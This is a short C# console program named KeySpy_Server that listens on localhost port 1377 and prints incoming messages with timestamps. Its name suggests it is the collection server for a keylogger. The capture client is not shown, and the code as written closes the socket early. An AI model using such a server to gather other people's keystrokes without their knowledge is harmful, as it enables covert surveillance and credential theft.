using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

namespace KeySpy_Server
{
    class Program
    {
        static Socket server = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static IPEndPoint iPEndPoint = new(IPAddress.Parse("127.0.0.1"), 1377);
        static void Main()
        {
            server.Bind(iPEndPoint);
            server.Listen(1);

            Console.ReadKey();

            try {
                server.AcceptAsync().ContinueWith((Task<Socket> t) =>
                {
                    Socket client = t.Result;
                    Console.WriteLine("Connection");
                    while (client.Connected)
                    {
                        var buff = new byte[1024];
                        client.Receive(buff);
                        Message(Encoding.ASCII.GetString(buff));
                    }
                });
            }
            catch { }
            finally { server.Close(); }
        }
        static void Message(string msg)
        {
            var d = DateTime.Now;
            Console.WriteLine(d.ToString("T") + ' ' + msg);
        }
    }
}
